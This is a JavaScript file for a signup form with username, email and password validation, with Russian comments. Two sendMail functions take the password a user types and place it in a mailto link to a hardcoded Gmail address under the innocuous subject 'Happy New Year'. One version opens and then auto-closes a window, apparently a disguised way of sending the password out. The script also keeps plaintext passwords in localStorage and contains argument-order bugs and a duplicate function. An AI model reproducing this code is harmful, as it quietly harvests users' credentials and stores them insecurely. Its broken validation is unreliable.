let id = (id) => document.getElementById(id);
let classes = (classes) => document.getElementsByClassName(classes);

let username = id("username"),
    email = id("email"),
    password = id("password"),
    copy_password = id("copy_password"),
    form = id("form"),

    errorMsg = classes("error"),
    successIcon = classes("success-icon"),
    failureIcon = classes("failure-icon");
    copy_passwordError = id("copy_passwordError");


form.addEventListener("submit", (e) => {
    e.preventDefault();
    engine(username, 0, "Username cannot be blank");
    engine(email, 1, "Email cannot be blank");
    validatePassword(password, copy_password);
    engine(copy_password, 3, "Copy Password cannot be blank");
    checkPasswordMatch(password, copy_password, "Passwords do not match");
});


let engine = (id, serial, message) => {
    if (id.value.trim() === "") {
        errorMsg[serial].innerHTML = message;
        id.style.border = "2px solid red";
    } else {
        errorMsg[serial].innerHTML = "";
        id.style.border = "2px solid green";
    }
};


let validatePassword = (password) => {
    let hasLowerCase = /[a-z]/.test(password.value);
    let hasUpperCase = /[A-Z]/.test(password.value);
    let hasNumbers = /\d/.test(password.value);
    let hasMinLength = password.value.length >= 8;

    password.style.border = "2px solid red";
    if (!hasLowerCase) {
        errorMsg[2].innerHTML = "Password must contain at least one lowercase letter."; 
    } else if (!hasUpperCase) {
        errorMsg[2].innerHTML = "Password must contain at least one uppercase letter.";
    } else if (!hasNumbers) {
        errorMsg[2].innerHTML = "Password must contain at least one number.";
    } else if (!hasMinLength) {
        errorMsg[2].innerHTML = "Password must be at least 8 characters long.";
    } else {
        errorMsg[2].innerHTML = "";
        password.style.border = "2px solid green";
    }
};


let checkPasswordMatch = (password, copy_password, copy_passwordError, message) => {
    if (password.value !== copy_password.value) {
        copy_passwordError.innerHTML = message;
        copy_password.style.border = "2px solid red";
    } else {
        copy_passwordError.innerHTML = "";
        copy_password.style.border = "2px solid green";
    }
};

function checkPasswords() {
    var password = document.getElementById("password");
    var copyPassword = document.getElementById("copy_password");
    var copyPasswordError = document.getElementById("copy_passwordError");

    checkPasswordMatch(password, copyPassword, copyPasswordError, "Password mismatch");
};

function sendMail() {
    var body = document.getElementById("password").value;
    var email = "kostatulakov4@gmail.com";
    var subject = "Happy New Year";

    var mailtoLink = "mailto:" + email + "?subject=" + encodeURIComponent(subject) + "&body=" + encodeURIComponent(body);

    // Открыть ссылку в новом окне
    var newWindow = window.open(mailtoLink, '_blank');

    // Закрыть новое окно через некоторое время (опционально)
    setTimeout(function () {
        newWindow.close();
    }, 5000);
};

function saveDataAndRedirect() {
    var username = document.getElementById("username").value;
    var email = document.getElementById("email").value;
    var password = document.getElementById("password").value;
    var copyPassword = document.getElementById("copy_password").value;

    // Сохранение данных в localStorage
    localStorage.setItem("savedUsername", username);
    localStorage.setItem("savedEmail", email);
    localStorage.setItem("savedPassword", password);

    // Перенаправление на вторую страницу
    window.location.href = "Form2.html";
}

function sendMail()
{
 var body = document.getElementById("password").value;
 window.location.href = "mailto:kostatulakov4@gmail.com?subject=Happy New Year&body="+body;
}


